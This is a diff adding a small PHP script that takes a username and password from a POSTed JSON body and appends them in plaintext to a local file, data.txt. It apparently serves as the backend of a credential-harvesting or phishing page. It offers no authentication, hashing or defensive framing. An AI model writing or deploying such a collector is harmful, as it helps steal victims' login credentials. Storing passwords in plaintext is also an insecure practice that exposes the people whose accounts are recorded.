@@ -1,0 +1,11 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $data = json_decode(file_get_contents('php://input'), true);
+    $username = $data['username'];
+    $password = $data['password'];
+
+    $file = fopen("data.txt", "a");
+    fwrite($file, "Username: $username, Password: $password\n");
+    fclose($file);
+}
+?>
